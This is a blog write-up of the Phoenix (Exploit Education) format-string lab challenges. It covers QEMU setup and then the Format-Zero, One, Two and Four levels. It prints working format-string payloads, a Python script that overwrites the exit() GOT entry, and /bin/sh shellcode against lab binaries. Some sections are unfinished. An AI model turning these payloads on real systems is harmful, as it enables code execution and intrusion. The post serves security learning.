---
layout: phoenix
title: "Welcome to Jekyll!"
date: 2025-04-06 12:26:40 +0530
categories: jekyll update
---

---

#  Phoenix:

**Phoenix** is the first part of the binary exploitation learning series by [Exploit Education](https://exploit.education/).

---

##  Getting Started

You can download the Phoenix challenge files from the official page:

 [exploit.education/downloads](https://exploit.education/downloads/)

> ⚠️ At the time of writing, the prebuilt repo wasn’t available.
> So, I built the VM manually using QEMU — and I’ll show you how to do the same!

---

## For Windows Users

### 1. **Download the Image**

* Choose the `amd64` version (or whichever matches your architecture).
* Format: `.qcow2` image inside a `.zip` file.

### 2. **Extract & Navigate**

```bash
unzip phoenix-amd64.zip
cd phoenix-amd64/
```

### 3. **Install QEMU**

QEMU is required to emulate the VM.
For best compatibility, run it through **WSL (Windows Subsystem for Linux)**.

Install QEMU (on WSL):

```bash
sudo apt update && sudo apt install qemu-system-x86
```

---

### 4. **Launch the VM**

Run the following from the extracted image directory:

```bash
qemu-system-x86_64 \
  -m 512M \
  -kernel ./vmlinuz-4.9.0-8-amd64 \
  -initrd ./initrd.img-4.9.0-8-amd64 \
  -hda ./exploit-education-phoenix-amd64.qcow2 \
  -append "root=/dev/sda1 console=ttyS0" \
  -nographic
```

---

## Default Credentials

| Username | `user`   |
| -------- | -------- |
| Passowrd | `user`   |

---

## Accessing the Challenges

Once logged in:

```bash
cd /opt/phoenix/amd64
```

Replace `amd64` with your architecture if you're using a different one.

---

## You're In!

If everything worked, your terminal (via WSL) should show a login prompt and boot into the Phoenix VM. From here, you can start working on the binary exploitation challenges.

> Pro Tip: Use `tmux` or split terminals to keep debugger sessions, source code, and shell access visible at the same time.

---

<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>

---

# Format-Zero — Phoenix Exploit Education

**Challenge**: [Phoenix/Format-Zero](https://exploit.education/phoenix/format-zero/)

**Goal**: Overflow the buffer and change the value of the `changeme` variable using a **format string vulnerability**.

---

## Quick History

From [Wikipedia](https://en.wikipedia.org/wiki/Uncontrolled_format_string#:~:text=The%20use%20of%20format%20string,data%20without%20a%20format%20string.):

> *The use of format string bugs as an attack vector was discovered in September 1999 by Tymm Twillman during a security audit of the ProFTPD daemon. The audit uncovered an `snprintf` that directly passed user-generated data without a format string. By crafting input with `%x` (to pop stack values) and `%n` (to overwrite memory), attackers could escalate privileges.*

⚡ **Takeaway**: `printf`-style functions are dangerous when they trust user input as the format string.

---

## Starting the Challenge

![binary-start](/assets/phoenix-format/image0.png)

At the start, we see:

```
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
```

Clearly, our mission is to *change* the variable `changeme`. 🚩

---

## Strategy

We know format string vulnerabilities typically affect functions like `printf()`, `sprintf()`, etc.
Here, the vulnerable binary uses `sprintf`.

We’ll need to:

* Find the buffer.
* Locate the `changeme` variable.
* Use **format specifiers** to overwrite it.

---

## Disassembly in GDB

![disassembly](/assets/phoenix-format/image1.png)

Looking at the disassembly of `main`:

```c
(gdb) disassemble main
Dump of assembler code for function main:
   0x000000000040069d <+0>:     push   rbp
   0x000000000040069e <+1>:     mov    rbp,rsp
   0x00000000004006a1 <+4>:     sub    rsp,0x50
   0x00000000004006a5 <+8>:     mov    DWORD PTR [rbp-0x44],edi
   0x00000000004006a8 <+11>:    mov    QWORD PTR [rbp-0x50],rsi
   0x00000000004006ac <+15>:    mov    edi,0x400790
   0x00000000004006b1 <+20>:    call   0x4004e0 <puts@plt>
   0x00000000004006b6 <+25>:    mov    rdx,QWORD PTR [rip+0x200423]        # 0x600ae0 <stdin>
   0x00000000004006bd <+32>:    lea    rax,[rbp-0x40]
   0x00000000004006c1 <+36>:    mov    esi,0xf
   0x00000000004006c6 <+41>:    mov    rdi,rax
   0x00000000004006c9 <+44>:    call   0x4004d0 <fgets@plt>
   0x00000000004006ce <+49>:    test   rax,rax
   0x00000000004006d1 <+52>:    jne    0x4006e7 <main+74>
   0x00000000004006d3 <+54>:    mov    esi,0x4007dc
   0x00000000004006d8 <+59>:    mov    edi,0x1
   0x00000000004006dd <+64>:    mov    eax,0x0
   0x00000000004006e2 <+69>:    call   0x4004f0 <errx@plt>
   0x00000000004006e7 <+74>:    mov    BYTE PTR [rbp-0x31],0x0
   0x00000000004006eb <+78>:    mov    DWORD PTR [rbp-0x10],0x0
   0x00000000004006f2 <+85>:    lea    rdx,[rbp-0x40]
   0x00000000004006f6 <+89>:    lea    rax,[rbp-0x30]
   0x00000000004006fa <+93>:    mov    rsi,rdx
   0x00000000004006fd <+96>:    mov    rdi,rax
   0x0000000000400700 <+99>:    mov    eax,0x0
   0x0000000000400705 <+104>:   call   0x400500 <sprintf@plt>
   0x000000000040070a <+109>:   mov    eax,DWORD PTR [rbp-0x10]
   0x000000000040070d <+112>:   test   eax,eax
   0x000000000040070f <+114>:   je     0x40071d <main+128>
   0x0000000000400711 <+116>:   mov    edi,0x4007f8
   0x0000000000400716 <+121>:   call   0x4004e0 <puts@plt>
   0x000000000040071b <+126>:   jmp    0x400727 <main+138>
   0x000000000040071d <+128>:   mov    edi,0x400830
   0x0000000000400722 <+133>:   call   0x4004e0 <puts@plt>
   0x0000000000400727 <+138>:   mov    edi,0x0
   0x000000000040072c <+143>:   call   0x400510 <exit@plt>
End of assembler dump.
```


* `rbp-0x40` → input buffer (`fgets` writes here).
* `rbp-0x30` → destination buffer (`sprintf` writes here).
* `rbp-0x10` → the **`changeme` variable** we must overwrite.

 **Key insight**:
`sprintf(rbp-0x30, rbp-0x40, …)` takes our input (`rbp-0x40`) as the *format string*.

Later, the program checks `rbp-0x10`. If it’s nonzero, we win.

---

## Exploitation Approach

We can abuse format specifiers:

* `%x` → dump stack values.
* `%n` → write the number of characters printed so far into memory.
* `%<num>x` → pad output with spaces (controls the value `%n` writes).
* `%0<num>x` → same as above, but with `0` padding.

---

## First Try: Stack Dump

Payload:

```
%x%x%x%x
```

![stack-dump](/assets/phoenix-format/image2.png)

Why does this work? 

* On **x86\_64**, each stack word is **8 bytes**.
* `4 × 8 = 32` → exactly the offset to reach `rbp-0x10`.
* So, `%x%x%x%x` conveniently walks us across 32 bytes.

On a **32-bit system**, each word is 4 bytes — we’d need more `%x` to cover the same distance.

⚠️ **Note**: This approach is *architecture-dependent* and unreliable. We need something more controlled.

---

## 🛠 Controlled Exploit: Using Widths

Instead of random `%x`, let’s **control how many bytes are written**:

* `%32x` → prints a hex value padded to *32 characters*.
* `%032x` → same, but padded with **zeros** (`0x30`) instead of spaces (`0x20`).

Why useful? Because `%n` writes the **number of characters printed so far** into memory.

By carefully choosing padding, we can set `changeme` to any value.

![stack-dump](/assets/phoenix-format/image.png)

---

##  Final Notes

* `%32x` ensures we’ve written 32 characters → `%n` stores 32 into `changeme`.
* Padding characters differ: space (`0x20`) vs zero (`0x30`).
* Exploit depends on *word size* (32-bit vs 64-bit).

With the right payload, `changeme` flips and the challenge is solved!

---

<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>

---

# Format-One — Phoenix / Exploit Education

**Challenge**: [Phoenix / Format-One](https://exploit.education/phoenix/format-one/)

**Goal**: Overflow the buffer and change the value of the `changeme` variable using a **format string vulnerability**.

---

## Overview

This write-up documents the analysis and exploit for the `format-one` binary from the Phoenix (Exploit Education) set. The goal is to place a specific 32-bit value into a stack variable (`changeme`) by abusing a format-string/sprintf pattern used in the program.

---

## Running the Challenge

When the binary is started it prints a welcome message and indicates that `changeme` does not hold the expected magic value:

![Program output](/assets/phoenix-format/image-1.png)

That tells us the program reads input and stores something which influences the `changeme` variable. The goal is to make it equal to the magic value tested later in `main`.

---

## Static analysis — GDB & Disassembly

Disassembling `main` shows the following (trimmed for relevance):

```asm
(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004006ed <+0>:     push   rbp
   0x00000000004006ee <+1>:     mov    rbp,rsp
   0x00000000004006f1 <+4>:     sub    rsp,0x50
   ...
   0x000000000040075a <+109>:   mov    eax,DWORD PTR [rbp-0x10]
   0x000000000040075d <+112>:   cmp    eax,0x45764f6c
   0x0000000000400762 <+117>:   je     0x40077a <main+141>
   ...
```

Key observation: the variable at `[rbp-0x10]` (`changeme`) is compared with the constant `0x45764f6c`. Our exploit must set this exact value.

---

## Exploit

We craft an input that writes the required value using the format string vulnerability:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"%32x" + b"\x6c\x4f\x76\x45")' > /tmp/payload.bin

./format-one < /tmp/payload.bin
```

Result:

![Exploit success](/assets/phoenix-format/image-2.png)

---

## Final Notes

* The challenge is similar to `format-zero`, but instead of just printing stack contents, we must **place a specific hex value into `changeme`**.
* The target value is `0x45764f6c`.
* This is accomplished by crafting the right payload with a format specifier and the correct bytes.

---

<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>

---

# Format-Two — Phoenix Exploit Education

**Challenge**: [Phoenix/Format-Two](https://exploit.education/phoenix/format-two/)

**Goal**: Overflow the buffer and change the value of the `changeme` variable using a **format string vulnerability**.

---

## Quick History

From [Wikipedia](https://en.wikipedia.org/wiki/Uncontrolled_format_string#:~:text=The%20use%20of%20format%20string,data%20without%20a%20format%20string.):

> *The use of format string bugs as an attack vector was discovered in September 1999 by Tymm Twillman during a security audit of the ProFTPD daemon. The audit uncovered an `snprintf` that directly passed user-generated data without a format string. By crafting input with `%x` (to pop stack values) and `%n` (to overwrite memory), attackers could escalate privileges.*

⚡ **Takeaway**: `printf`-style functions are dangerous when they trust user input as the format string.

---

## Starting the Challenge


![binary-start](/assets/phoenix-format/image0.png)

At the start, we see:

```
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
```

Clearly, our mission is to *change* the variable `changeme`.

---

## Strategy





```c
(gdb) disassemble main
Dump of assembler code for function main:
   0x000000000040068d <+0>:     push   rbp
   0x000000000040068e <+1>:     mov    rbp,rsp
   0x0000000000400691 <+4>:     sub    rsp,0x110
   0x0000000000400698 <+11>:    mov    DWORD PTR [rbp-0x104],edi
   0x000000000040069e <+17>:    mov    QWORD PTR [rbp-0x110],rsi
   0x00000000004006a5 <+24>:    mov    edi,0x400780
   0x00000000004006aa <+29>:    call   0x4004b0 <puts@plt>
   0x00000000004006af <+34>:    cmp    DWORD PTR [rbp-0x104],0x1
   0x00000000004006b6 <+41>:    jle    0x400705 <main+120>
   0x00000000004006b8 <+43>:    lea    rax,[rbp-0x100]
   0x00000000004006bf <+50>:    mov    edx,0x100
   0x00000000004006c4 <+55>:    mov    esi,0x0
   0x00000000004006c9 <+60>:    mov    rdi,rax
   0x00000000004006cc <+63>:    call   0x4004d0 <memset@plt>
   0x00000000004006d1 <+68>:    mov    rax,QWORD PTR [rbp-0x110]
   0x00000000004006d8 <+75>:    add    rax,0x8
   0x00000000004006dc <+79>:    mov    rcx,QWORD PTR [rax]
   0x00000000004006df <+82>:    lea    rax,[rbp-0x100]
   0x00000000004006e6 <+89>:    mov    edx,0x100
   0x00000000004006eb <+94>:    mov    rsi,rcx
   0x00000000004006ee <+97>:    mov    rdi,rax
   0x00000000004006f1 <+100>:   call   0x4004c0 <strncpy@plt>
   0x00000000004006f6 <+105>:   lea    rax,[rbp-0x100]
   0x00000000004006fd <+112>:   mov    rdi,rax
   0x0000000000400700 <+115>:   call   0x40066d <bounce>
   0x0000000000400705 <+120>:   mov    eax,DWORD PTR [rip+0x2003e5]        # 0x600af0 <changeme>
   0x000000000040070b <+126>:   test   eax,eax
   0x000000000040070d <+128>:   je     0x40071b <main+142>
   0x000000000040070f <+130>:   mov    edi,0x4007d0
   0x0000000000400714 <+135>:   call   0x4004b0 <puts@plt>
   0x0000000000400719 <+140>:   jmp    0x400725 <main+152>
   0x000000000040071b <+142>:   mov    edi,0x40080f
   0x0000000000400720 <+147>:   call   0x4004b0 <puts@plt>
   0x0000000000400725 <+152>:   mov    edi,0x0
   0x000000000040072a <+157>:   call   0x4004e0 <exit@plt>
End of assembler dump.
```

---

<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>


---

# Format-Four — Phoenix Exploit Education

**Challenge**: [Phoenix/Format-Four](https://exploit.education/phoenix/format-four/)

**Goal**: Overwrite the GOT entry for `exit@plt` via a **format string vulnerability** so that a subsequent call to `exit()` transfers control to a function of our choosing (for example, `congratulations`).

---


# Starting the Challenge

Setting up challenge, and inputting a string we get nothing, fine:

![input](/assets/phoenix-format/input.png)

Well, `nm ./format-four`
``` c
user@phoenix-amd64:/opt/phoenix/i486$ nm format-four
0804972c d _DYNAMIC
080497cc d _GLOBAL_OFFSET_TABLE_
08049720 d __CTOR_END__
0804971c d __CTOR_LIST__
08049728 D __DTOR_END__
08049724 d __DTOR_LIST__
080486b4 r __EH_FRAME_BEGIN__
08048718 r __FRAME_END__
0804864c r __GNU_EH_FRAME_HDR
080497f0 D __TMC_END__
080497f0 B __bss_start
08048590 t __do_global_ctors_aux
08048420 t __do_global_dtors_aux
080497ec D __dso_handle
         U __libc_start_main
080497f0 D _edata
08049810 B _end
080485c1 T _fini
080482d8 T _init
08048350 T _start
0804836b T _start_c
080484e5 T bounce
080497f0 b completed.5195
08048503 T congratulations
08048390 t deregister_tm_clones
080497f4 b dtor_idx.5197
         U exit
080484a0 t frame_dummy
08048523 T main
080497f8 b object.5207
         U printf
         U puts
         U read
080483d0 t register_tm_clones
```

I note an _additional function_: `congratulations: 08048503 `. From the previous challenge, the program logic resides in `bounce`. 

This challenge demonstrates how format string vulnerabilities can be combined with dynamic linking internals (PLT/GOT) to redirect program flow even when a vulnerable function does not return to a controlled address. In this binary the vulnerable code path ends with a call to `exit()`; a classic return-oriented buffer overflow would fail because control does not return to `main`. The correct approach is to overwrite the GOT entry for `exit` with the address of a chosen target so that when the program calls `exit` it jumps to our code.

Key objectives:

* Identify the vulnerable function and confirm it accepts user-controlled input as a *format string*.
* Locate the GOT/PLT entries — specifically `exit@plt` and its GOT slot.
* Use format string primitives to write the address of the target function (e.g. `congratulations`) into the GOT entry for `exit`.
* Trigger the call to `exit` and observe control transfer.

---

## Theory

**PLT (Procedure Linkage Table)** and **GOT (Global Offset Table)** are key to `dynamic linking`:

A short refresher on the compile/link process:

Preprocessing (#include, macros) → .i

Compilation (C → assembly) → .s

Assembly (assembly → object file) → .o

Linking (object(s) + libraries → executable) → ELF/PE/Mach-O

Linkage can be static (resolved at compile/link time) or dynamic (resolved at runtime).

Example C program:

int main() {
    printf("hello!\n");
    exit(0);
}

In a **dynamically-linked** binary, calls to _external functions_ like `printf` and `exit` are typically implemented via `puts@plt` / `exit@plt` _(PLT stubs)_ which use the GOT to store the resolved libc address the first time the symbol is used.

![gdboutput](/assets/phoenix-format/gdbcolor.png)

> Important notes:

* `PLT/GOT` entries are _*per-symbol*_.

* Whether the compiler uses puts or printf in the `PLT` depends on optimization and safety; sometimes `printf` is left intact and sometimes a simpler `puts` is used.

* On Windows the analogous structure is the `Import Address Table` (IAT) with *`thunks`*.

* **PLT (Procedure Linkage Table)** contains stubs used to call externally-linked functions. On first use a PLT stub performs a lookup and stores the resolved address into the GOT.
* **GOT (Global Offset Table)** is where resolved function pointers are stored; modifying a GOT slot reroutes the corresponding PLT stub.

This is why overwriting `exit`'s GOT entry is an effective way to hijack control flow at the point of an `exit()` call.

---
## Exploit Strategy


Exploit Strategy is fairly similar to format-three, but instead of just changing variable we need to overwrite GOT entry, as discussed above 

Format-four is interesting because it requires understanding linkage and exploitation of the PLT and GOT. After starting the challenge and providing input, nothing visible happens at first.


The approach borrows from Format-Three but targeted at a GOT entry instead of a stack variable. Key steps:

1. Locate the GOT entry for `exit@plt`.
2. Locate the target function (`congratulations`) address.
3. Place the GOT address(es) on the stack so the format string can reference them as write destinations.
4. Use format-string write primitives (`%n`, `%hn`, `%hhn`) to perform controlled partial writes into the GOT slot, assembling the full target address across multiple smaller writes.
5. Trigger `exit()` and observe the redirection.


Digging deep into disassembly we need to find entry of exit@plt in GOT table,


spin up gdb, 

We need to find initial entry:

![alt text](/assets/phoenix-format/img.png)

The entry is like: 0x80497e4  => 08048503

we need to place 0x80497e4 onto stack and try to write 08048503 in it,

Initial approach is to place 0x80497e4 and count offset till when the printf starts printing from it stack and once it rinted out by %n we would write 08048503 like previously in Format-Three


If you read the payload its coming out 45 bytes exact, we need this 45 bytes alignment anyways , our %n is working and perfectly dumping the bytes in our desired address,


But we dont want 45 we need, more, so

After lots of trial and error, 


``` asm

import struct
EXIT_PLT = 0x80497e4
exploit = ""
exploit += struct.pack("I", EXIT_PLT)
exploit += struct.pack("I", EXIT_PLT+1)
exploit += struct.pack("I", EXIT_PLT+2)
exploit += struct.pack("I", EXIT_PLT+3)
exploit += "%x" * 10
exploit += "%x"
exploit += "A" * 189
exploit += "%n"
exploit += " " * 130
exploit += "%n"
exploit += " " * 1663
exploit += "%n"
#exploit += " "
#exploit += "%n"
print exploit
```
```
user@phoenix-amd64:/opt/phoenix/i486$ python2 /tmp/payload.py > /tmp/payload
```
```
user@phoenix-amd64:/opt/phoenix/i486$ ./format-four < /tmp/payload
```
![output](/assets/phoenix-format/code-redirection.png)

---

## Popping the Shell

After proving GOT redirection to `congratulations`, the next step is to redirect `exit()` to the buffer containing shellcode. The idea is the same: write the address of a buffer (for example `ebp+0x8` or another stable stack/buffer address) into the `exit` GOT slot, then trigger `exit` so control transfers to our shellcode.

> bytes in the format string (such as `0x90` or NOPs) are not executed by `printf`; they become executable only after control is redirected to their memory location and the CPU begins executing there.

first in .gdbinit i unset and set the following:


Lets reuse previous payload and clear the buffer
```
import struct
EXIT_PLT = 0x80497e4
exploit = ""
exploit += "A" * 4
exploit += "B" * 4
exploit += "C" * 4
exploit += "D" * 4
exploit += struct.pack("I", EXIT_PLT)
exploit += struct.pack("I", EXIT_PLT+1)
exploit += struct.pack("I", EXIT_PLT+2)
exploit += struct.pack("I", EXIT_PLT+3)
exploit += "%x" * 10
exploit += "%x"
exploit += "%n"
exploit += "%n"
exploit += "%n"
print exploit
```

in gdb:
unset env LINES
unset env COLUMNS
unset env TERM
unset env _
unset env OLDPWD
unset env SHLVL

disassemble bounce and check the buffer out:

![alt image](/assets/phoenix-format/buffer.png)


i used this script for .gdbinit
```
unset env LINES
unset env COLUMNS
unset env TERM
unset env _
unset env OLDPWD
unset env SHLVL

set disassembly-flavor intel
disassemble bounce

b *0x080484f1
run < /tmp/payload2
x/20gwx $ebp+0x8
```

The logic stays same just instead of writing congratulation's address we need push buffer's address[ebp+0x8] on the stack.

deliberatly choosing this 0xffffcd80 as first four address space are for AAAABBBBCCCCDDDD  (0xffffcd70)

![alt image](/assets/phoenix-format/bounce.png)

```
import struct
ADDR = 0x080497e4
addresses = struct.pack("I", ADDR)
addresses += struct.pack("I", ADDR+1)
addresses += struct.pack("I", ADDR+2)
addresses += struct.pack("I", ADDR+3)

target = 0xffffcd80

shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"


buf = addresses
#buf += "\xCC"
buf += "\x90" * 43
buf += shellcode
buf += "%x" * 11
buf += " "
buf += "%n"
buf += " " * 70
buf += "%n"
buf += " " * 50
buf += "%n"
buf += " " * 256
buf += "%n"

print buf
```

i first calculated the buffer address and reduces 43+21 bytes later so the padding would be adjusted.

Run with:

```bash
cat /tmp/payload - | ./format-four
```


![alt image](/assets/phoenix-format/win.png)

---

# Takeway:

---


<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>



